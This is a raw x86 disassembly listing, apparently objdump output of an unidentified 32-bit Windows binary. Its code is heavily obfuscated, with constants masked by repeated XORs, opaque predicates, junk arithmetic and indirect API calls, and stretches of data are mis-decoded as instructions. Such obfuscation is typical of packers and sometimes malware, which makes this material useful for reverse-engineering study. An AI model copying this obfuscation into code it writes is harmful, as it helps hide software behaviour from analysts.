  420db7:	bound  edx,QWORD PTR [ebx]
  420db9:	loop   0x420d85
  420dbb:	mov    al,ds:0xfdf6ffdb
  420dc0:	data16 adc bl,dl
  420dc3:	lods   eax,DWORD PTR ds:[esi]
  420dc4:	fcomip st,st(2)
  420dc6:	out    0x42,al
  420dc8:	scas   al,BYTE PTR es:[edi]
  420dc9:	mov    dl,BYTE PTR [eax]
  420dcb:	repnz int3 
  420dcd:	push   0xc02c74f3
  420dd2:	xchg   ecx,eax
  420dd3:	mov    bl,0x4a
  420dd5:	push   edi
  420dd6:	imul   edi,DWORD PTR [ebx],0xd692268
  420ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ddd:	xor    al,ah
  420ddf:	mov    ds,WORD PTR [ecx]
  420de1:	add    eax,0xa0e72c4c
  420de6:	nop
  420de7:	adc    al,0x43
  420de9:	and    eax,0x1f57eb9e
  420dee:	jmp    FWORD PTR [esi]
  420df0:	mov    cl,0xc6
  420df2:	xchg   ebx,eax
  420df4:	(bad)  
  420df5:	mov    dl,0x71
  420df7:	inc    edx
  420df8:	js     0x420e41
  420dfa:	and    esp,DWORD PTR [ebp-0x2860b151]
  420e00:	jle    0x420dfa
  420e02:	add    al,BYTE PTR [ecx]
  420e04:	jecxz  0x420dc7
  420e06:	pushf  
  420e07:	rcl    DWORD PTR [edx-0x39],0x63
  420e0b:	gs leave 
  420e0d:	add    DWORD PTR [ecx+ebx*2+0x2f],esp
  420e11:	das    
  420e12:	jl     0x420da1
  420e14:	ret    
  420e15:	mov    ds,WORD PTR [ebx+0x57ebc47a]
  420e1b:	add    bh,BYTE PTR [ecx-0x23]
  420e1e:	les    ecx,FWORD PTR [ebx-0x15]
  420e21:	fs mov esi,0xe8864296
  420e27:	cld    
  420e28:	adc    eax,0xb70aadab
  420e2d:	inc    ebp
  420e2e:	cwde   
  420e2f:	push   eax
  420e30:	or     edx,edi
  420e32:	pop    ss
  420e33:	out    dx,al
  420e34:	mov    edx,0x400ce15c
  420e39:	inc    ebp
  420e3a:	jmp    0x420e6e
  420e3c:	stos   BYTE PTR es:[edi],al
  420e3d:	mov    ch,0xe2
  420e3f:	mov    al,ds:0x2da1d990
  420e44:	sbb    al,0x33
  420e46:	xlat   BYTE PTR ds:[ebx]
  420e47:	ret    0xedb
  420e4a:	sbb    DWORD PTR [edx+0x558910dc],esi
  420e50:	adc    esi,DWORD PTR [edi-0x2e]
  420e53:	cmp    bh,BYTE PTR [ebx-0x7e5e73e5]
  420e59:	jmp    0x358b:0x29ad
  420e60:	dec    ebx
  420e61:	add    DWORD PTR [edx+0x0],0x833f3519
  420e68:	inc    edx
  420e69:	add    BYTE PTR [edi],cl
  420e6b:	scas   eax,DWORD PTR es:[edi]
  420e6c:	rol    BYTE PTR [ebx+0x42835b3d],1
  420e72:	add    BYTE PTR [eax],al
  420e74:	mov    DWORD PTR ds:0x428213,ebx
  420e7a:	mov    DWORD PTR ds:0x42814b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42813f
  420e8e:	mov    DWORD PTR ds:0x428223,0x776f
  420e98:	cmp    DWORD PTR ds:0x42835b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x4281f7
  420eaa:	push   0x42805f
  420eaf:	call   DWORD PTR ds:0x428e18
  420eb5:	add    ecx,DWORD PTR ds:0x428357
  420ebb:	xor    esi,DWORD PTR ds:0x4281ef
  420ec1:	adc    DWORD PTR ds:0x428247,edx
  420ec7:	xor    DWORD PTR ds:0x4282cf,edx
  420ecd:	mov    esi,DWORD PTR ds:0x4281fb
  420ed3:	or     esi,DWORD PTR ds:0x428157
  420ed9:	mov    DWORD PTR ds:0x4281fb,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42822f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428117
  420eef:	sbb    eax,DWORD PTR ds:0x4282cb
  420ef5:	mov    ds:0x428117,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281c7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42831f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f23:	mov    DWORD PTR ds:0x428263,0x1362
  420f2d:	mov    DWORD PTR ds:0x428213,edx
  420f33:	mov    DWORD PTR ds:0x42824f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428333,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428e90
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42819f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281ab
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428227,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42821f
  420f87:	sbb    edx,DWORD PTR ds:0x428367
  420f8d:	mov    DWORD PTR ds:0x42821f,edx
  420f93:	add    DWORD PTR ds:0x42815b,ecx
  420f99:	sub    DWORD PTR ds:0x42834b,0x4282bb
  420fa3:	cmp    DWORD PTR ds:0x428247,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42832b
  420fb0:	movzx  edx,BYTE PTR ds:0x428133
  420fb7:	mov    DWORD PTR ds:0x4282b7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428363,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428367,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428247,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d34
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282c7
  421000:	sbb    DWORD PTR ds:0x428243,edx
  421006:	movzx  edx,WORD PTR ds:0x42811b
  42100d:	or     edx,DWORD PTR ds:0x428343
  421013:	mov    DWORD PTR ds:0x42811b,edx
  421019:	dec    DWORD PTR ds:0x428333
  42101f:	sub    DWORD PTR ds:0x42823f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42812b,0x0
  421048:	mov    DWORD PTR ds:0x428337,0x62d9
  421052:	mov    DWORD PTR ds:0x428117,0x300d
  42105c:	mov    DWORD PTR ds:0x42811b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282bf
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42832f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42812b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d54
  4210a1:	sbb    ecx,DWORD PTR ds:0x428243
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428267,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428123
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x4221f9
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x42133c
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x3bbc:0x65828d2a
  42115b:	push   ds
  42115c:	jns    0x4211da
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    BYTE PTR [esi+edx*1+0x18],dh
  421165:	sbb    dh,dh
  421167:	inc    ebx
  421168:	(bad)  
  421169:	fimul  WORD PTR [esi-0x5ddbf342]
  42116f:	sbb    ch,BYTE PTR [edi+0x1]
  421172:	in     al,0x1e
  421174:	(bad)  
  421175:	cli    
  421176:	ja     0x421119
  421178:	stos   DWORD PTR es:[edi],eax
  421179:	mov    bh,0xee
  42117b:	inc    ecx
  42117c:	nop
  42117d:	pop    edx
  42117e:	fild   DWORD PTR [esi-0x71c5b5df]
  421184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421185:	js     0x421116
  421187:	inc    eax
  421188:	push   cs
  421189:	cmp    BYTE PTR [eax+0x6f],cl
  42118c:	lea    edx,[ebx]
  42118e:	push   es
  42118f:	dec    eax
  421190:	das    
  421191:	add    ecx,DWORD PTR [ecx-0x321622e]
  421197:	mov    al,al
  421199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42119a:	xchg   ebp,eax
  42119b:	ret    0x4bb4
  42119e:	jbe    0x4211ec
  4211a0:	jae    0x4211ff
  4211a2:	jmp    0xd709c8cd
  4211a7:	sub    ebp,DWORD PTR cs:[ebp+edx*2-0x3970b36c]
  4211af:	push   ebp
  4211b0:	loopne 0x421213
  4211b2:	mov    ebp,0x5e29c653
  4211b7:	shl    DWORD PTR [ebp-0x44],1
  4211ba:	pop    ebx
  4211bb:	dec    esi
  4211bc:	push   eax
  4211bd:	mov    fs,WORD PTR [ebp-0x5bfa9f2c]
  4211c3:	jmp    0x712c:0x8505a474
  4211ca:	add    ah,cl
  4211cc:	mov    eax,ds:0x472fbe73
  4211d1:	mov    dl,0xf3
  4211d3:	mov    eax,0x81a8b257
  4211d8:	int3   
  4211d9:	test   eax,0x471be664
  4211de:	mov    al,0x91
  4211e0:	jne    0x42116d
  4211e2:	adc    esi,DWORD PTR [eax+0x5c1f277]
  4211e8:	loop   0x4211ad
  4211ea:	js     0x42123a
  4211ec:	sub    eax,0xf4c952de
  4211f1:	push   esi
  4211f2:	jb     0x42124f
  4211f4:	and    al,0x0
  4211f6:	mov    ecx,0xa37ea2e2
  4211fb:	cmp    edx,esp
  4211fd:	jae    0x42120d
  4211ff:	mov    al,ds:0xb3672ad0
  421204:	data16 xor al,0x93
  421207:	test   BYTE PTR [ebp+0x24],bl
  42120a:	inc    eax
  42120b:	dec    esp
  42120c:	sub    ch,BYTE PTR ds:0x5917022a
  421212:	mov    WORD PTR [esi-0x3c3bbbc6],ss
  421218:	scas   al,BYTE PTR es:[edi]
  421219:	lea    esi,gs:[edx]
  42121c:	xchg   edx,eax
  42121d:	lds    ebp,FWORD PTR [ecx+esi*4]
  421220:	mov    edx,0xd06b4b88
  421225:	mov    al,0xd8
  421227:	aad    0x33
  421229:	scas   al,BYTE PTR es:[edi]
  42122a:	push   esi
  42122b:	out    0x3a,al
  42122d:	pushw  cs
  42122f:	fisttp QWORD PTR [edi]
  421231:	shl    BYTE PTR [edi-0x4c1adbfb],cl
  421237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421238:	ret    0x31ef
  42123b:	popa   
  42123c:	imul   ebp,ecx,0x30cfa94c
  421242:	inc    BYTE PTR ds:0x63006504
  421248:	scas   eax,DWORD PTR es:[edi]
  421249:	jne    0x4211d5
  42124b:	ds jae 0x421218
  42124e:	int    0x5b
  421250:	int3   
  421251:	jae    0x421213
  421253:	add    edx,ebp
  421255:	adc    ch,BYTE PTR [esi]
  421257:	adc    al,ch
  421259:	shr    al,1
  42125b:	mov    DWORD PTR [eax+ecx*8+0x580f374f],edi
  421262:	aam    0x72
  421264:	imul   ecx,ecx,0x10bd1281
  42126a:	mov    edx,0x6c1e3a92
  42126f:	and    esp,edi
  421271:	inc    edi
  421272:	scas   al,BYTE PTR es:[edi]
  421273:	icebp  
  421274:	sub    esi,DWORD PTR [ecx-0x1a]
  421277:	jbe    0x421292
  421279:	adc    al,0xcb
  42127c:	retf   
  42127d:	mov    DWORD PTR [edi-0xa],edi
  421280:	mov    cs,ebp
  421282:	cdq    
  421283:	sub    eax,0x5a95f3f5
  421288:	xchg   esi,eax
  421289:	pop    eax
  42128a:	(bad)  
  42128b:	repnz inc edi
  42128d:	cmc    
  42128e:	shl    BYTE PTR [eax],0x32
  421291:	sbb    ebp,DWORD PTR [ecx+0x4b]
  421294:	adc    esi,ecx
  421296:	icebp  
  421297:	sbb    DWORD PTR [ecx+0x64],eax
  42129a:	std    
  42129b:	les    ebx,FWORD PTR [edx+0x456c2a05]
  4212a1:	inc    esi
  4212a2:	dec    ebp
  4212a3:	aam    0x82
  4212a5:	jno    0x4212a1
  4212a7:	sub    ah,ch
  4212a9:	aad    0x2d
  4212ab:	mov    ch,0x42
  4212ad:	(bad)  
  4212ae:	ins    BYTE PTR es:[edi],dx
  4212af:	mov    edi,0x9f3142f
  4212b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212b5:	pop    esi
  4212b6:	iret   
  4212b7:	and    ebx,DWORD PTR [ebp-0x71eb0318]
  4212bd:	inc    esp
  4212be:	mov    ecx,0x9675b984
  4212c3:	push   ebx
  4212c4:	fist   DWORD PTR [edi]
  4212c6:	sub    BYTE PTR [eax+0x7d],0x29
  4212ca:	out    dx,eax
  4212cb:	dec    esp
  4212cc:	cmp    eax,0x47e68be
  4212d1:	mov    bh,0x15
  4212d3:	int3   
  4212d4:	or     al,0x94
  4212d6:	adc    al,0x55
  4212d8:	mov    eax,ds:0xf27ca349
  4212dd:	mov    eax,ebx
  4212df:	outs   dx,BYTE PTR ds:[esi]
  4212e0:	xchg   esi,eax
  4212e1:	cmc    
  4212e2:	ss push cs
  4212e4:	pushf  
  4212e5:	call   0x7e69:0x6dba6039
  4212ec:	pushf  
  4212ed:	in     eax,0x94
  4212ef:	sbb    esp,DWORD PTR [ebx]
  4212f1:	adc    BYTE PTR [edi-0x7e],ah
  4212f4:	icebp  
  4212f5:	stos   DWORD PTR es:[edi],eax
  4212f6:	and    al,0xee
  4212f8:	fstp   QWORD PTR [edx-0x44]
  4212fb:	adc    ecx,eax
  4212fd:	or     edx,DWORD PTR [edi]
  4212ff:	fist   WORD PTR [edi]
  421301:	aam    0x14
  421303:	scas   eax,DWORD PTR es:[edi]
  421304:	enter  0x3ea0,0x76
  421308:	cmc    
  421309:	mov    dl,0x22
  42130b:	sbb    cl,dh
  42130d:	aam    0xe6
  42130f:	sbb    eax,DWORD PTR [eax-0x30c62b60]
  421315:	pushf  
  421316:	dec    ebx
  421317:	loop   0x4212f1
  421319:	retf   
  42131a:	xor    cl,dl
  42131c:	loop   0x42136d
  42131e:	mov    DWORD PTR [eax],esi
  421320:	ins    BYTE PTR es:[edi],dx
  421321:	loopne 0x4212b8
  421323:	scas   al,BYTE PTR es:[edi]
  421324:	repz call 0x78b16b44
  42132a:	pop    es
  42132b:	adc    al,0x97
  42132d:	dec    ebp
  42132e:	inc    ebp
  42132f:	out    0x62,eax
  421331:	fistp  WORD PTR [ecx]
  421333:	(bad)  
  421334:	mov    WORD PTR [esi-0x4f4d057c],ds
  42133a:	sub    BYTE PTR [ecx],ah
  42133c:	mov    eax,DWORD PTR [ebp-0x15c]
  421342:	mov    edx,DWORD PTR [ebp-0x158]
  421348:	xor    eax,0xca79a575
  42134d:	xor    edx,0x9c1b89e8
  421353:	mov    cl,0x2
  421355:	call   0x40a9b5
  42135a:	mov    ecx,edx
  42135c:	mov    edx,DWORD PTR [ebp-0x15c]
  421362:	mov    DWORD PTR [ebp-0x218],esi
  421368:	mov    esi,DWORD PTR [ebp-0x158]
  42136e:	xor    edx,0xca79a575
  421374:	xor    esi,0x9c1b89e8
  42137a:	mov    DWORD PTR [ebp-0x21c],eax
  421380:	mov    eax,edx
  421382:	mov    edx,esi
  421384:	mov    DWORD PTR [ebp-0x220],ecx
  42138a:	mov    cl,0x3e
  42138c:	call   0x4221f9
  421391:	mov    esi,DWORD PTR [ebp-0x21c]
  421397:	or     esi,eax
  421399:	mov    eax,DWORD PTR [ebp-0x220]
  42139f:	or     eax,edx
  4213a1:	push   eax
  4213a2:	push   esi
  4213a3:	push   ebx
  4213a4:	push   edi
  4213a5:	call   0x416c20
  4213aa:	mov    esi,DWORD PTR [ebp-0x218]
  4213b0:	cmp    esi,eax
  4213b2:	jne    0x421468
  4213b8:	mov    eax,DWORD PTR [ebp-0x154]
  4213be:	mov    edx,DWORD PTR [ebp-0x150]
  4213c4:	xor    eax,0xca79a575
  4213c9:	xor    edx,0x9c1b89e8
  4213cf:	mov    cl,0x2
  4213d1:	call   0x40a9b5
  4213d6:	mov    esi,eax
  4213d8:	mov    edi,edx
  4213da:	mov    eax,DWORD PTR [ebp-0x154]
  4213e0:	mov    edx,DWORD PTR [ebp-0x150]
  4213e6:	xor    eax,0xca79a575
  4213eb:	xor    edx,0x9c1b89e8
  4213f1:	mov    cl,0x3e
  4213f3:	call   0x4221f9
  4213f8:	or     esi,eax
  4213fa:	or     edi,edx
  4213fc:	mov    eax,DWORD PTR [ebp-0x15c]
  421402:	mov    edx,DWORD PTR [ebp-0x158]
  421408:	xor    eax,0xca79a575
  42140d:	xor    edx,0x9c1b89e8
  421413:	mov    cl,0x2
  421415:	call   0x40a9b5
  42141a:	mov    ebx,eax
  42141c:	mov    eax,edx
  42141e:	mov    ecx,DWORD PTR [ebp-0x15c]
  421424:	mov    edx,DWORD PTR [ebp-0x158]
  42142a:	xor    ecx,0xca79a575
  421430:	xor    edx,0x9c1b89e8
  421436:	mov    DWORD PTR [ebp-0x224],eax
  42143c:	mov    eax,ecx
  42143e:	mov    cl,0x3e
  421440:	call   0x4221f9
  421445:	or     ebx,eax
  421447:	mov    eax,DWORD PTR [ebp-0x224]
  42144d:	or     eax,edx
  42144f:	push   eax
  421450:	push   ebx
  421451:	push   edi
  421452:	push   esi
  421453:	call   0x416c20
  421458:	mov    DWORD PTR [ebp-0x178],eax
  42145e:	jmp    0x421728
  421463:	jmp    0x4216de
  421468:	lea    eax,[ebp-0x168]
  42146e:	mov    DWORD PTR [ebp-0x164],eax
  421474:	mov    eax,DWORD PTR [ebp-0x164]
  42147a:	mov    DWORD PTR [eax],0xa4069aae
  421480:	mov    eax,DWORD PTR [ebp-0x168]
  421486:	xor    eax,0xa4069aae
  42148b:	shr    eax,0x2
  42148e:	mov    ecx,DWORD PTR [ebp-0x168]
  421494:	xor    ecx,0xa4069aae
  42149a:	shl    ecx,0x1e
  42149d:	or     eax,ecx
  42149f:	mov    ecx,DWORD PTR [ebp-0x174]
  4214a5:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214a9:	mov    DWORD PTR [ebp-0x160],eax
  4214af:	mov    esi,DWORD PTR [ebp-0x160]
  4214b5:	mov    eax,DWORD PTR [ebp-0x154]
  4214bb:	mov    edx,DWORD PTR [ebp-0x150]
  4214c1:	xor    eax,0xca79a575
  4214c6:	xor    edx,0x9c1b89e8
  4214cc:	mov    cl,0x2
  4214ce:	call   0x40a9b5
  4214d3:	mov    edi,eax
  4214d5:	mov    ebx,edx
  4214d7:	mov    eax,DWORD PTR [ebp-0x154]
  4214dd:	mov    edx,DWORD PTR [ebp-0x150]
  4214e3:	xor    eax,0xca79a575
  4214e8:	xor    edx,0x9c1b89e8
  4214ee:	mov    cl,0x3e
  4214f0:	call   0x4221f9
  4214f5:	or     edi,eax
  4214f7:	or     ebx,edx
  4214f9:	mov    eax,DWORD PTR [ebp-0x15c]
  4214ff:	mov    edx,DWORD PTR [ebp-0x158]
  421505:	xor    eax,0xca79a575
  42150a:	xor    edx,0x9c1b89e8
  421510:	mov    cl,0x2
  421512:	call   0x40a9b5
  421517:	mov    ecx,edx
  421519:	mov    edx,DWORD PTR [ebp-0x15c]
  42151f:	mov    DWORD PTR [ebp-0x228],esi
  421525:	mov    esi,DWORD PTR [ebp-0x158]
  42152b:	xor    edx,0xca79a575
  421531:	xor    esi,0x9c1b89e8
  421537:	mov    DWORD PTR [ebp-0x22c],eax
  42153d:	mov    eax,edx
  42153f:	mov    edx,esi
  421541:	mov    DWORD PTR [ebp-0x230],ecx
  421547:	mov    cl,0x3e
  421549:	call   0x4221f9
  42154e:	mov    esi,DWORD PTR [ebp-0x22c]
  421554:	or     esi,eax
  421556:	mov    eax,DWORD PTR [ebp-0x230]
  42155c:	or     eax,edx
  42155e:	push   eax
  42155f:	push   esi
  421560:	push   ebx
  421561:	push   edi
  421562:	call   0x416c20
  421567:	mov    esi,DWORD PTR [ebp-0x228]
  42156d:	cmp    esi,eax
  42156f:	je     0x4215e4
  421575:	mov    eax,DWORD PTR [ebp-0x154]
  42157b:	mov    edx,DWORD PTR [ebp-0x150]
  421581:	xor    eax,0xca79a575
  421586:	xor    edx,0x9c1b89e8
  42158c:	mov    cl,0x2
  42158e:	call   0x40a9b5
  421593:	mov    esi,eax
  421595:	mov    edi,edx
  421597:	mov    eax,DWORD PTR [ebp-0x154]
  42159d:	mov    edx,DWORD PTR [ebp-0x150]
  4215a3:	xor    eax,0xca79a575
  4215a8:	xor    edx,0x9c1b89e8
  4215ae:	mov    cl,0x3e
  4215b0:	call   0x4221f9
  4215b5:	or     esi,eax
  4215b7:	or     edi,edx
  4215b9:	mov    eax,DWORD PTR [ebp-0x160]
  4215bf:	imul   esi,eax
  4215c2:	add    esi,DWORD PTR [ebp-0x170]
  4215c8:	mov    DWORD PTR [ebp-0x16c],esi
  4215ce:	mov    eax,DWORD PTR [ebp-0x16c]
  4215d4:	mov    DWORD PTR [ebp-0x178],eax
  4215da:	jmp    0x421728
  4215df:	jmp    0x42168f
  4215e4:	mov    eax,DWORD PTR [ebp-0x154]
  4215ea:	mov    edx,DWORD PTR [ebp-0x150]
  4215f0:	xor    eax,0xca79a575
  4215f5:	xor    edx,0x9c1b89e8
  4215fb:	mov    cl,0x2
  4215fd:	call   0x40a9b5
  421602:	mov    esi,eax
  421604:	mov    edi,edx
  421606:	mov    eax,DWORD PTR [ebp-0x154]
  42160c:	mov    edx,DWORD PTR [ebp-0x150]
  421612:	xor    eax,0xca79a575
  421617:	xor    edx,0x9c1b89e8
  42161d:	mov    cl,0x3e
  42161f:	call   0x4221f9
  421624:	or     esi,eax
  421626:	or     edi,edx
  421628:	mov    eax,DWORD PTR [ebp-0x15c]
  42162e:	mov    edx,DWORD PTR [ebp-0x158]
  421634:	xor    eax,0xca79a575
  421639:	xor    edx,0x9c1b89e8
  42163f:	mov    cl,0x2
  421641:	call   0x40a9b5
  421646:	mov    ebx,eax
  421648:	mov    eax,edx
  42164a:	mov    ecx,DWORD PTR [ebp-0x15c]
  421650:	mov    edx,DWORD PTR [ebp-0x158]
  421656:	xor    ecx,0xca79a575
  42165c:	xor    edx,0x9c1b89e8
  421662:	mov    DWORD PTR [ebp-0x234],eax
  421668:	mov    eax,ecx
  42166a:	mov    cl,0x3e
  42166c:	call   0x4221f9
  421671:	or     ebx,eax
  421673:	mov    eax,DWORD PTR [ebp-0x234]
  421679:	or     eax,edx
  42167b:	push   eax
  42167c:	push   ebx
  42167d:	push   edi
  42167e:	push   esi
  42167f:	call   0x416c20
  421684:	mov    DWORD PTR [ebp-0x178],eax
  42168a:	jmp    0x421728
  42168f:	mov    eax,DWORD PTR [ebp-0x15c]
  421695:	mov    edx,DWORD PTR [ebp-0x158]
  42169b:	xor    eax,0xca79a575
  4216a0:	xor    edx,0x9c1b89e8
  4216a6:	mov    cl,0x2
  4216a8:	call   0x40a9b5
  4216ad:	mov    esi,eax
  4216af:	mov    edi,edx
  4216b1:	mov    eax,DWORD PTR [ebp-0x15c]
  4216b7:	mov    edx,DWORD PTR [ebp-0x158]
  4216bd:	xor    eax,0xca79a575
  4216c2:	xor    edx,0x9c1b89e8
  4216c8:	mov    cl,0x3e
  4216ca:	call   0x4221f9
  4216cf:	or     esi,eax
  4216d1:	or     edi,edx
  4216d3:	mov    DWORD PTR [ebp-0x178],esi
  4216d9:	jmp    0x421728
  4216de:	mov    eax,DWORD PTR [ebp-0x15c]
  4216e4:	mov    edx,DWORD PTR [ebp-0x158]
  4216ea:	xor    eax,0xca79a575
  4216ef:	xor    edx,0x9c1b89e8
  4216f5:	mov    cl,0x2
  4216f7:	call   0x40a9b5
  4216fc:	mov    esi,eax
  4216fe:	mov    edi,edx
  421700:	mov    eax,DWORD PTR [ebp-0x15c]
  421706:	mov    edx,DWORD PTR [ebp-0x158]
  42170c:	xor    eax,0xca79a575
  421711:	xor    edx,0x9c1b89e8
  421717:	mov    cl,0x3e
  421719:	call   0x4221f9
  42171e:	or     esi,eax
  421720:	or     edi,edx
  421722:	mov    DWORD PTR [ebp-0x178],esi
  421728:	mov    ecx,DWORD PTR [ebp-0xd8]
  42172e:	mov    eax,0x459a
  421733:	xor    edx,edx
  421735:	div    ecx
  421737:	mov    ecx,DWORD PTR [ebp-0xdc]
  42173d:	and    eax,ecx
  42173f:	add    eax,DWORD PTR [ebp-0x44]
  421742:	mov    ecx,DWORD PTR [ebp-0xe0]
  421748:	lea    eax,[eax+ecx*1+0x272f]
  42174f:	xor    eax,0x1080c
  421754:	add    eax,DWORD PTR [ebp-0x178]
  42175a:	mov    DWORD PTR [ebp-0xe8],eax
  421760:	mov    DWORD PTR [ebp-0xc],0x5950
  421767:	mov    DWORD PTR [ebp-0xf8],0x4964
  421771:	mov    DWORD PTR [ebp-0x130],0x3
  42177b:	mov    DWORD PTR [ebp-0x20],0x2df9
  421782:	mov    DWORD PTR [ebp-0x8],0x4524
  421789:	mov    DWORD PTR [ebp-0xd4],0x637e
  421793:	mov    DWORD PTR [ebp-0x110],0x38c8
  42179d:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217a7:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217b1:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217bb:	mov    eax,DWORD PTR [ebp-0xf8]
  4217c1:	mov    ecx,DWORD PTR [ebp-0x130]
  4217c7:	xor    edx,edx
  4217c9:	div    ecx
  4217cb:	add    eax,0x454e
  4217d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4217d3:	and    eax,ecx
  4217d5:	xor    eax,0x5940
  4217da:	add    eax,DWORD PTR [ebp+0x8]
  4217dd:	mov    ecx,DWORD PTR [ebp-0x110]
  4217e3:	mov    edx,DWORD PTR [ebp-0xa4]
  4217e9:	sub    ecx,edx
  4217eb:	mov    edx,DWORD PTR [ebp-0xd4]
  4217f1:	or     ecx,edx
  4217f3:	mov    edx,DWORD PTR [ebp-0x8]
  4217f6:	and    ecx,edx
  4217f8:	mov    edx,DWORD PTR [ebp-0x20]
  4217fb:	xor    ecx,edx
  4217fd:	mov    edx,DWORD PTR [ebp-0x10c]
  421803:	mov    esi,0x180f
  421808:	sub    esi,edx
  42180a:	mov    edx,DWORD PTR [ebp-0xa0]
  421810:	imul   esi,edx
  421813:	xor    esi,0x402b
  421819:	xor    esi,0xfed78c17
  42181f:	mov    edx,DWORD PTR [ebp-0xe8]
  421825:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  42182c:	add    ecx,eax
  42182e:	add    esi,ecx
  421830:	mov    DWORD PTR [ebp-0x38],esi
  421833:	mov    DWORD PTR [ebp-0x4],0x59a8
  42183a:	mov    DWORD PTR [ebp-0x30],0x7021
  421841:	mov    DWORD PTR [ebp-0xf4],0x6210
  42184b:	mov    DWORD PTR [ebp-0x58],0x73d5
  421852:	mov    DWORD PTR [ebp-0x124],0x1e7d
  42185c:	mov    DWORD PTR [ebp-0x3c],0x3144
  421863:	mov    eax,DWORD PTR [ebp-0x30]
  421866:	xor    eax,0x75cb
  42186b:	mov    ecx,DWORD PTR [ebp-0x4]
  42186e:	imul   eax,ecx
  421871:	mov    ecx,DWORD PTR [ebp+0x8]
  421874:	lea    ecx,[ecx+eax*1-0x2123b90]
  42187b:	mov    eax,DWORD PTR [ebp-0xf4]
  421881:	and    eax,0x6b34
  421886:	and    eax,0x658d
  42188b:	xor    edx,edx
  42188d:	push   0x6
  42188f:	pop    esi
  421890:	div    esi
  421892:	imul   eax,eax,0x3fb9
  421898:	mov    edx,DWORD PTR [ebp-0x3c]
  42189b:	and    edx,0x58c7
